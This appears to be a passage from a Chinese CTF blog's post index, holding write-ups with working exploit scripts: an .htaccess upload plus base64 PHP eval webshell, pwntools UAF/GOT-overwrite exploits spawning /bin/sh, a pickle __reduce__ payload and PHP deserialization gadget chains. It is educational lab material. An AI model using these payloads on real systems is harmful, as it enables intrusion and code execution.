remote(后面的文件上传也会打印出来所以无所谓的)。\n上传 webshell因为这里过滤了后缀名有 ph 就会结束程序，内容存在&lt;?也会存在程序，还检测了文件的头信息是否为图片格式。所以第一反应就是.htaccess 上传。\n在.htaccess 的文件内容:\nAddType application/x-httpd-php .gif;上面的内容表示把.gif为后缀名的文件当作执行程序加载php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;;这句则是在访问一个php文件的时候，会在文件解析之前自动包含上面文件\n\n所以很简单的就可以构造出攻击脚本:\nimport requestsimport base64url = &#x27;http://58d97b5a-ba1f-46e5-82e1-ab2eff363141.node4.buuoj.cn:81/?_=$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=get_the_flag&#x27;htaccess = b&#x27;&#x27;&#x27;\\x00\\x00\\x85\\x48\\x85\\x18    AddType application/x-httpd-php .gif    php_value auto_append_file  &quot;php://filter/convert.base64-decode/resource=back.gif&quot;&#x27;&#x27;&#x27;# 因为检测了&lt;?所以webshell经过base64编码来绕过，所以上面包含的时候采用php伪协议decode一下file = &#123;    &#x27;file&#x27;: (&#x27;.htaccess&#x27;, htaccess, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)back = b&#x27;GIF89a&#x27; + b&quot;aa&quot; + \\    base64.b64encode(b&quot;&lt;?php eval($_POST[&#x27;wow&#x27;]);?&gt;&quot;)# 这里是一个很坑的点，需要额外增加两个字节，凑足8字节满足base64算法file = &#123;    &#x27;file&#x27;: (&#x27;back.gif&#x27;, back, &#x27;image/gif&#x27;)&#125;res = requests.post(url=url, files=file).textprint(res)\n\n绕过 open_basedir上传了 webshell 之后，直接 var_dump(scandir(‘/‘));应为 open_basedir 的效果无法获取\n\n需要绕过 open_basedir，我就给出 payload 就行，具体原理就去下面的链接去了解。\n\n挂出绕过 open_basedir 从底层出发找出原理的大佬文章的链接\nhttps://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2\n","categories":["web-buuctf"],"tags":["无数字字母shell .htaccess上传 绕过open_basedir"]},{"title":"supermarket","url":"/2021/11/03/supermarket/","content":"检测保护题目给了libc文件\n\n堆栈不可执行\n分析流程void sub_8048FC1()&#123;  while ( 1 )  &#123;    sub_8048864();    printf(&quot;your choice&gt;&gt; &quot;);    switch ( sub_804882E() )    &#123;      case 1:        add();        break;      case 2:        del();        break;      case 3:        list();        break;      case 4:        change_price();        break;      case 5:        change_description();        break;      case 6:        exit(0);        return;      default:        puts(&quot;invalid choice&quot;);        break;    &#125;  &#125;&#125;\n\n一个菜单题(感觉最近的做的菜单题都是堆题)\nint add()&#123;  char *v1; // ebx  char *v2; // ebx  char src[16]; // [esp+4h] [ebp-24h] BYREF  int v4; // [esp+14h] [ebp-14h]  int v5; // [esp+18h] [ebp-10h]  int i; // [esp+1Ch] [ebp-Ch]  for ( i = 0; i &lt;= 15 &amp;&amp; (&amp;s2)[i]; ++i )    ;  if ( i &gt; 15 )    return puts(&quot;no more space&quot;);  printf(&quot;name:&quot;);  sub_8048812(src, 16);  v5 = sub_8048D45(src);  if ( v5 != -1 )    return puts(&quot;name exist&quot;);  v5 = sub_8048D95();  if ( v5 == -1 )    return puts(&quot;no more space&quot;);  (&amp;s2)[v5] = malloc(0x1Cu);  strcpy((&amp;s2)[v5], src);  printf(&quot;name:%s\\n&quot;, src);  v4 = 0;  printf(&quot;price:&quot;);  v4 = sub_804882E();  printf(&quot;price:%d\\n&quot;, v4);  if ( v4 &gt; 0 &amp;&amp; v4 &lt;= 999 )    *((&amp;s2)[v5] + 4) = v4;  *((&amp;s2)[v5] + 5) = 0;  while ( *((&amp;s2)[v5] + 5) &lt;= 0 || *((&amp;s2)[v5] + 5) &gt; 256 )  &#123;    printf(&quot;descrip_size:&quot;);    v1 = (&amp;s2)[v5];    *(v1 + 5) = sub_804882E();  &#125;  printf(&quot;descrip_size:%d\\n&quot;, *((&amp;s2)[v5] + 5));  v2 = (&amp;s2)[v5];  *(v2 + 6) = malloc(*(v2 + 5));  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v5] + 6), *((&amp;s2)[v5] + 5));&#125;\n\nint list()&#123;  const char *v0; // esi  int v1; // ebx  const char *v2; // edi  size_t v3; // eax  int v4; // ebx  const char *v5; // esi  size_t v6; // eax  const void *v7; // ebx  size_t v8; // eax  size_t v9; // eax  char s[785]; // [esp+Bh] [ebp-32Dh] BYREF  int i; // [esp+31Ch] [ebp-1Ch]  memset(s, 0, sizeof(s));  for ( i = 0; i &lt;= 15; ++i )  &#123;    if ( (&amp;s2)[i] )    &#123;      if ( strlen(*((&amp;s2)[i] + 6)) &gt; 0x10 )      &#123;        v4 = *((&amp;s2)[i] + 4);        v5 = (&amp;s2)[i];        v6 = strlen(s);        sprintf(&amp;s[v6], &quot;%s: price.%d, des.&quot;, v5, v4);        v7 = *((&amp;s2)[i] + 6);        v8 = strlen(s);        memcpy(&amp;s[v8], v7, 0xDu);        v9 = strlen(s);        memcpy(&amp;s[v9], &quot;...\\n&quot;, 4u);      &#125;      else      &#123;        v0 = *((&amp;s2)[i] + 6);        v1 = *((&amp;s2)[i] + 4);        v2 = (&amp;s2)[i];        v3 = strlen(s);        sprintf(&amp;s[v3], &quot;%s: price.%d, des.%s\\n&quot;, v2, v1, v0);      &#125;    &#125;  &#125;  puts(&quot;all  commodities info list below:&quot;);  return puts(s);&#125;\n\nint change_description()&#123;  int v1; // [esp+8h] [ebp-10h]  int size; // [esp+Ch] [ebp-Ch]  v1 = sub_8048DC8();  if ( v1 == -1 )    return puts(&quot;not exist&quot;);  for ( size = 0; size &lt;= 0 || size &gt; 256; size = sub_804882E() )    printf(&quot;descrip_size:&quot;);  if ( *((&amp;s2)[v1] + 5) != size )    realloc(*((&amp;s2)[v1] + 6), size);  printf(&quot;description:&quot;);  return sub_8048812(*((&amp;s2)[v1] + 6), *((&amp;s2)[v1] + 5));&#125;\n\n看一年找不到问题，去看wp发现有UAF漏洞。主要问题发生在realloc这里，这里的realloc并没有把返回的指针赋值给(&amp;s2)[v1]+6这个位置，所以(&amp;s2)[v1]+6这里还是指向原先的堆块。\n还有额外的就是每一个商品的结构体为:\nstruct Product&#123;    char name[16];    int price;    int descrip_size;    int *description;&#125;;\n\n在add一个新的商品的时候会创建两个chunk，一个是product结构体，另一个则是生成一个chunk大小为descrip_size并且将chunk的指针赋值给description。\nrealloc(void *__ptr, size_t __size)：更改已经配置的内存空间，即更改由malloc()函数分配的内存空间的大小。\n如果将分配的内存减少，realloc仅仅是改变索引的信息。\n如果是将分配的内存扩大，则有以下情况：1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。\n利用分析主要的问题就是在change_description函数里面的realloc重新分配size的时候没有给原先的指针赋值。\n利用思路就是，先进入add函数会生成一个node1然后会继续生成一个node1_description一共生成两个chunk，再进入change_description函数修改descrip_size变大，到了realloc函数就会先free掉以前的node1_description然后新生成一个chunk，但是node1的description指针还是指向的以前的，这时再一次进入add函数会生成一个node2和node2_description，然而这个node1是生成在node1_description上面，所以这个时候就可以控制node1_description将node2的description指针指向到atoi的got表修改到system的位置\n根据上面的思路就是:修改got表-&gt;泄漏atoi的真实地址-&gt;计算偏移量并修改atoi的表为system地址-&gt;输入’/bin/sh’获得shell\nexpfrom pwn import *elf = ELF(&#x27;./questions/supermarket&#x27;)libc = ELF(&#x27;/home/tcdy/download/05e872a7193b4a85877be9d95ac6fc94/libc.so.6&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 54781)context.log_level = &#x27;debug&#x27;atoi_got_addr = elf.got[&#x27;atoi&#x27;]def create(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;price:&#x27;)    r.sendline(b&#x27;100&#x27;)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)def delete(name):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)def show():    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;3&#x27;)def update(name, descrip_size, description):    r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)    r.sendline(b&#x27;5&#x27;)    r.recvuntil(b&#x27;name:&#x27;)    r.sendline(name)    r.recvuntil(b&#x27;descrip_size:&#x27;)    r.sendline(bytes(str(descrip_size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;description:&#x27;)    r.sendline(description)create(b&#x27;0&#x27;, 0x80, b&#x27;a&#x27;*0x10)# 这里我们0x80个字节的意思则是因为我们在输入的时候，最后的一个字符会被改为0所以一般要大于0x1c就行create(b&#x27;1&#x27;, 0x20, b&#x27;a&#x27;*0x10)# 这里创建两个chunk是因为realloc的第一种情况，要是当前内存段存在内存空间的话就直接扩展就行，这样我们就无法UAF所以需要再创一个来chunk来占位置update(b&#x27;0&#x27;, 0x90, b&#x27;&#x27;)create(b&#x27;2&#x27;, 0x20, b&#x27;a&#x27;*0x10)payload = b&#x27;2&#x27;.ljust(16, b&#x27;\\0&#x27;)+p32(100)+p32(0x20)+p32(atoi_got_addr)update(b&#x27;0&#x27;, 0x80, payload)show()r.recvuntil(b&#x27;\\n2: price.100, des.&#x27;, drop=True)real_atoi_addr = u32(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(4, b&#x27;\\0&#x27;))print(real_atoi_addr)offset = real_atoi_addr-libc.symbols[&#x27;atoi&#x27;]system_addr = libc.symbols[&#x27;system&#x27;]+offsetupdate(b&#x27;2&#x27;, 0x20, p32(system_addr))r.recvuntil(b&#x27;your choice&gt;&gt;&#x27;)r.sendline(b&#x27;/bin/sh&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["UAF"]},{"title":"time_formatter","url":"/2021/10/25/time-formatter/","content":"第一次做堆题目还是有点激动。\n检查保护\n没什么好说的，就开启了canary和nx。\n分析分析流程__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  __gid_t v3; // eax  int v4; // eax  v3 = getegid();  setresgid(v3, v3, v3);  setbuf(stdout, 0LL);  puts(&quot;Welcome to Mary&#x27;s Unix Time Formatter!&quot;);  do  &#123;    while ( 2 )    &#123;      puts(&quot;1) Set a time format.&quot;);      puts(&quot;2) Set a time.&quot;);      puts(&quot;3) Set a time zone.&quot;);      puts(&quot;4) Print your time.&quot;);      puts(&quot;5) Exit.&quot;);      __printf_chk(1LL, &quot;&gt; &quot;);      fflush(stdout);      switch ( choice() )      &#123;        case 1u:          v4 = choice_1();          break;        case 2u:          v4 = choice_2();          break;        case 3u:          v4 = choice_3();          break;        case 4u:          v4 = choice_4();          break;        case 5u:          v4 = choice_5();          break;        default:          continue;      &#125;      break;    &#125;  &#125;  while ( !v4 );  return 0LL;&#125;\n\n流程很简单，就是一直选这几个选项然后执行函数，main函数没什么漏洞\nint choice()// 输入一个数字选择下面的执行内容&#123;  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  fgets(s, 16, stdin);  return atoi(s);&#125;\n\n__int64 choice_1()&#123;  void *v0; // rbx  v0 = get_format(&quot;Format: &quot;);  if ( check(v0) )  &#123;    ptr = v0;    puts(&quot;Format set.&quot;);  &#125;  else  &#123;    puts(&quot;Format contains invalid characters.&quot;);    sub_400C7E(v0);  &#125;  return 0LL;&#125;\n\n__int64 __fastcall get_format(const char *a1)&#123;  char s[1024]; // [rsp+8h] [rbp-410h] BYREF  unsigned __int64 v3; // [rsp+408h] [rbp-10h]  v3 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;%s&quot;, a1);  fflush(stdout);  fgets(s, 0x400, stdin);  s[strcspn(s, &quot;\\n&quot;)] = 0;  return vuln_func(s);&#125;\n\nchar *__fastcall vuln_func(const char *a1)// 漏洞函数&#123;  char *v1; // rax  char *v2; // rbx  v1 = strdup(a1);// strdup函数就是，使用malloc创建一个跟a1大小一样的chunk，然后把a1的值复制过去  if ( !v1 )    err(1, &quot;strdup&quot;);  v2 = v1;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;strdup(%p) = %p\\n&quot;, a1, v2);  return v2;&#125;\n\n_BOOL8 __fastcall check(char *s)&#123;  char accept[51]; // [rsp+5h] [rbp-43h] BYREF  unsigned __int64 v3; // [rsp+38h] [rbp-10h]  strcpy(accept, &quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;);// 检验输入的内容必须是这里面的内容  v3 = __readfsqword(0x28u);  return strspn(s, accept) == strlen(s);&#125;\n\n从这里看的话其实vuln_func没有问题，关键在chioce_4这个函数里面\n__int64 choice_4()&#123;  char command[2048]; // [rsp+8h] [rbp-810h] BYREF  unsigned __int64 v2; // [rsp+808h] [rbp-10h]  v2 = __readfsqword(0x28u);  if ( ptr )  &#123;    __snprintf_chk(command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;, dword_602120, ptr);// 然而这里给command赋值通过格式化字符串，还有ptr也在其中，所以只要修改ptr为&#x27;;/bin/sh;&#x27;就好了    __printf_chk(1LL, &quot;Your formatted time is: &quot;);    fflush(stdout);    if ( getenv(&quot;DEBUG&quot;) )      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\\n&quot;, command);    setenv(&quot;TZ&quot;, value, 1);    system(command);// 可以看到这里执行了command  &#125;  else  &#123;    puts(&quot;You haven&#x27;t specified a format!&quot;);  &#125;  return 0LL;&#125;\n\n可以看到上面的ptr被过滤了，刚好这个直接放进去是不得行的。\n__int64 choice_5()&#123;  __int64 result; // rax  char s[16]; // [rsp+8h] [rbp-20h] BYREF  unsigned __int64 v2; // [rsp+18h] [rbp-10h]  v2 = __readfsqword(0x28u);  sub_400C7E(ptr);// 这个其实就是free，我也把代码贴出来了  sub_400C7E(value);  __printf_chk(1LL, &quot;Are you sure you want to exit (y/N)? &quot;);  fflush(stdout);  fgets(s, 16, stdin);  result = 0LL;  if ( (s[0] &amp; 0xDF) == 89 )  &#123;    puts(&quot;OK, exiting.&quot;);    result = 1LL;  &#125;  return result;&#125;\n\nvoid __fastcall sub_400C7E(void *ptr)&#123;  if ( getenv(&quot;DEBUG&quot;) )    __fprintf_chk(stderr, 1LL, &quot;free(%p)\\n&quot;, ptr);  free(ptr);&#125;\n\n可以看到，我们在选择5的时候程序是先将ptr free掉然后再询问是否退出，看到这里的第一反应就是UAF\n__int64 choice_3()&#123;  value = get_format(&quot;Time zone: &quot;);  puts(&quot;Time zone set.&quot;);  return 0LL;&#125;\n\n利用过程在执行的时候，首先选择1然后随便写入一个符合过滤要求的字符，然后写入到chunk当中，然后直接选择5，这个时候已经是free掉了ptr但是ptr没有置为null所以还是指向到被free的chunk的位置，然后是否推出选择N不退出，然后选择3，在3当中新生成的chunk其实就是ptr所指向的chunk，而且没有过滤所以直接写入payload就好，然后选择4就可以getshell\nexpfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)# r = remote(&#x27;111.200.241.244&#x27;, 57916)r = process(&#x27;./questions/5781dfd4ffed4d51a72a28a8571ef063&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;Format: &#x27;)r.sendline(b&#x27;A&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;5&#x27;)r.recvuntil(b&#x27;Are you sure you want to exit (y/N)? &#x27;)r.sendline(b&#x27;N&#x27;)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;3&#x27;)payload = b&quot;&#x27;;/bin/sh;&#x27;&quot;r.recvuntil(b&#x27;Time zone: &#x27;)r.sendline(payload)r.recvuntil(b&#x27;&gt; &#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["use after free"]},{"title":"反序列化漏洞的一些知识点","url":"/2021/09/17/unserialize/","content":"绕过__wakeup()函数把序列化产生的字符串里面的属性值增大比如:\tO:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t           ^\t         表示类中含有一个属性值\tO:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;\t\t\t   ^\t\t\t 修改为2即可绕过wakeup函数，可以写上__destruct()函数执行相应的响应体\n\n\n在绕过preg_match(“/[oc]:\\d/“)和__wakeup()在下面情况\n\n在序列化的过程中不同属性的对象序列化的结果不一致( &quot;=&gt;&quot; )Private属性 ： 数据类型:属性名长度:&quot;\\00类名\\00属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;Protected属性 ： 数据类型:属性名长度:&quot;\\00*\\00属性名&quot;;数据类型:属性值长度:&quot;属性值;;Public属性 ： 数据类型:属性名长度:&quot;属性名&quot;;数据类型:属性值长度:&quot;属性值&quot;;\n\n在反序列化的时候，会遵循某种规则首先判断字符串的一个元素，为大写的&quot;O&quot;，跳转到验证第二字符&quot;：&quot;冒号在验证冒号是，若是为数字就会正常序列化，若是为&quot;+&quot;就会跳转到验证数字然后继续序列化所以就可以利用这种方式来绕过类似于preg_match(&quot;/[oc]:\\d/&quot;)的函数\n\n\n\n但是会产生新的问题，在以往的过程中，习惯于直接echo出序列化的结果，再进行base64加密，但是在class内部的属性为private或者protected定义的时候就会产生破坏原本的结构，破坏\\00\n\n\n\n&lt;?phpclass Demo &#123;     private $file = &#x27;fl4g.php&#x27;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#x27;index.php&#x27;) &#123;             $this-&gt;file = &#x27;index.php&#x27;;             echo &quot;yes&quot;;        &#125;     &#125; &#125;$wow=new Demo(&quot;fl4g.php&quot;);echo serialize($wow);echo &quot;&lt;br&gt;&quot;;echo base64_encode(preg_replace(&quot;/1:&#123;s/&quot;,&quot;2:&#123;s&quot;,preg_replace(&quot;/:4/&quot;,&quot;:+4&quot;,serialize($wow))));\n\n输出的结果为：\nO:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==base64解码下面的内容后：O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;得到了下面的结果，其实也因为\\00被破坏才导致看起来是一样的protected属性被序列化的时候属性值会变成 %00*%00属性名private属性被序列化的时候属性值会变成 %00类名%00属性名PS:php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n\npython反序列化(pickle)\n\n很神奇的一点就是python会把反序列化的东西放在生成在byte中(尤为注意py2,3的区别)\n题目:buuctf ikun\nimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)        else:            return self.render(&#x27;no_ass.html&#x27;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#x27;become&#x27;)            # pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。            #             #            #             # pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，            #             #            #             # pickle序列化后的数据，可读性差，人一般无法识别。            p = pickle.loads(urllib.unquote(become))            # urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式            # pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回            return self.render(&#x27;form.html&#x27;, res=p, member=1)        except:            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)\n\nimport pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))# __reduce__:当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。# __reduce__ 被定义之后，当对象被Pickle时就会被调用。# 它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。# 这个元组包含2到5个元素，其中包括：#       一个可调用的对象，用于重建对象时调用；【我们这里的eval】#       一个参数元素，供那个可调用对象使用； 【我们这里的open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()】#       被传递给 __setstate__ 的状态（可选）；#       一个产生被pickle的列表元素的迭代器（可选）；#       一个产生被pickle的字典元素的迭代器（可选）a = pickle.dumps(payload())# pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中a = urllib.quote(a)print a\n\n\nPHP对于不存在的类反序列化问题\n\n&lt;?phpecho serialize(unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));var_dump((unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;&#x27;));\n\nO:1:&quot;A&quot;:1:&#123;s:1:&quot;b&quot;;s:3:&quot;wow&quot;;&#125;object(__PHP_Incomplete_Class)#1 (2) &#123;  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;  string(1) &quot;A&quot;  [&quot;b&quot;]=&gt;  string(3) &quot;wow&quot;&#125;可以发现产生的对象是__PHP_Incomplete_Class对象，反序列化的名字保存在__PHP_Incomplete_Class里面属性就直接放在下面\n\n现在我们自己创建一个一串反序列化的字符串\n&lt;?phpvar_dump(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;));var_dump(unserialize(serialize(unserialize(&#x27;a:2:&#123;i:0;O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;dzh&quot;;&#125;i:1;O:22:&quot;__PHP_Incomplete_Class&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;dzhsb&quot;;&#125;&#125;&#x27;))));\n\narray(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (1) &#123;    [&quot;name&quot;]=&gt;    string(5) &quot;dzhsb&quot;  &#125;&#125;array(2) &#123;  [0]=&gt;  object(__PHP_Incomplete_Class)#1 (2) &#123;    [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;    string(1) &quot;A&quot;    [&quot;name&quot;]=&gt;    string(3) &quot;dzh&quot;  &#125;  [1]=&gt;  object(__PHP_Incomplete_Class)#2 (0) &#123;  &#125;&#125;\n\n可以发现在经过一次反序列化然后序列化再一次反序列化之后，下面我们所创建的对象的属性已经不见了，那是因为，找不到__PHP_Incomplete_Class_Name这个属性，所以php直接将这个摧毁了。这种绕过方式在一些题目中可以找到。\n// index.php&lt;?phperror_reporting(0);include &quot;function.php&quot;;$res = unserialize($_POST[&#x27;d1no&#x27;]);if (preg_match(&#x27;/H3rmesk1t/i&#x27;, serialize($res))) &#123;    echo &quot;What??? try again!!!&quot; . PHP_EOL; // 这里其实存在问题的，应该直接抛出错误，要是直接echo的话会让上面的反序列化照常可以进行&#125;// function.php&lt;?phpfunction __autoload($coolClass)&#123;    require_once &quot;./$coolClass.php&quot;;&#125;// H3rmesk1t.php&lt;?phpclass Dino&#123;    public $var1;    public $var2;    function __construct($var1, $var2)    &#123;        $var1 = $var1;        $var2 = $var2;    &#125;    function __destruct()    &#123;        echo md5($this-&gt;var1) . &quot;\\n&quot;;        echo md5($this-&gt;var2) . &quot;\\n&quot;;        if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2))) &#123;            eval($this-&gt;var1);        &#125;    &#125;&#125;\n\n解题思路：\n// 首先必要的是绕过&quot;if (($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)))&quot;这条if语句;// 因为md5和sha1同时绕过的话，即便是碰撞也无能为力。所以寻找可以利用的原声类()&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    if (in_array(&#x27;toString&#x27;, $methods)) &#123;        echo $class;    &#125;&#125;// 通过这个方法找到已申明的类当中是否存在__toString方法// 然后这里选用的是Exception这个类，他的__toString返回值是输入的msg，所在的文件，所处于的行数。在md5函数还有sha1函数都会执行__toString然后return的值相同就可以绕过，然后修改后面的code值会让两个对象不相同(其实我觉得两个对象即便是不改后面的值也是相同的因为对象会新开辟内存所以不相同)。// 所以最终的exp&lt;?phpclass H3rmesk1t&#123;&#125;class Dino&#123;    public $var1;    public $var2;&#125;class wow&#123;    public $zzz;&#125;$payload = &#x27;?&gt;&lt;?php phpinfo();?&gt;&#x27;;$a = new Exception($payload);$b = new Exception($payload, 1);$x = new Dino();$x-&gt;var1 = $a;$x-&gt;var2 = $b;$y = new wow(); // __php_Incomplete_Class$y-&gt;zzz = new H3rmesk1t();$res = array($y, $x);echo urlencode(preg_replace(&#x27;/wow/&#x27;, &#x27;__php_Incomplete_Class&#x27;, serialize($res)));\n\n\nfast_destruct的怪异行为\n\n上面没有解释为什么需要这么搞。主要原因就是真正需要的函数是__destruct函数，但是反序列化的结果被赋值给了一个变量，就导致，要经过下面的if语句才能执行到destruct，但是如果没有”H3rmesk1t”那就无法通过function.php文件引入H3rmesk1t.php文件就会导致反序列化失败，但是有的话就会抛出错误中断反序列化的进度。所以就需要用到”__PHP_Incomplete_Class”这个对象来实现，根据上面的特性，这个在经过一次反序列化之后，在进行序列化的话就会抛弃内部的元素，达到了绕过的效果。还有一种方式就是fast_destruct。\n&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;&#x27;);==============================================================================================================================this is B::__wakeupthis is A::destructthis is B::__callthis is B::__destruct==============================================================================================================================&lt;?phpclass A&#123;    public function __destruct()    &#123;        print(&quot;this is A::destruct\\n&quot;);        $this-&gt;dzhsb-&gt;c();    &#125;&#125;class B&#123;    public function __call($f, $p)    &#123;        print(&quot;this is B::__call\\n&quot;);    &#125;    public function __wakeup()    &#123;        print(&quot;this is B::__wakeup\\n&quot;);    &#125;    public function __destruct()    &#123;        print(&quot;this is B::__destruct\\n&quot;);    &#125;&#125;unserialize(&#x27;O:1:&quot;A&quot;:1:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;;&#125;&#x27;);==============================================================================================================================PHP Notice:  unserialize(): Error at offset 35 of 37 bytes in /home/tcdy/Download/www/payload.php on line 25this is A::destructthis is B::__callthis is B::__wakeupthis is B::__destruct    // 改变属性的个数也行   O:1:&quot;A&quot;:2:&#123;s:5:&quot;dzhsb&quot;;O:1:&quot;B&quot;:0:&#123;&#125;&#125;\n\n","categories":["web"],"tags":["unserialize"]},{"title":"warmup_csaw_2016","url":"/2021/09/18/warmup-csaw-2016/","content":"下载附件之后的必要操作\n\n文件为64位文件。\n\n发现文件没有开任何保护。\n然后chmod 777 warmup_csaw_2016\n运行程序\n\n发现在wow这里打印除了一个地址。\n查看IDA pro反汇编结果\n__int64 __fastcall main(__int64 a1, char a2, char a3)&#123;  char s;  [rsp+0h] [rbp-80h]  char v5;  [rsp+40h] [rbp-40h]  write(1, -Warm Up-n, 0xAuLL);  write(1, WOW, 4uLL);  sprintf(&amp;s, %pn, sub_40060D);  write(1, &amp;s, 9uLL);  write(1, , 1uLL);  return gets(&amp;v5, ); // gets在c语言里面最容易出现漏洞&#125;\n\n然后在这里看到sprintf打印的就是一个地址点进去看一下\n函数sub_40060D的内容是\nint sub_40060D()&#123;  return system(&quot;cat 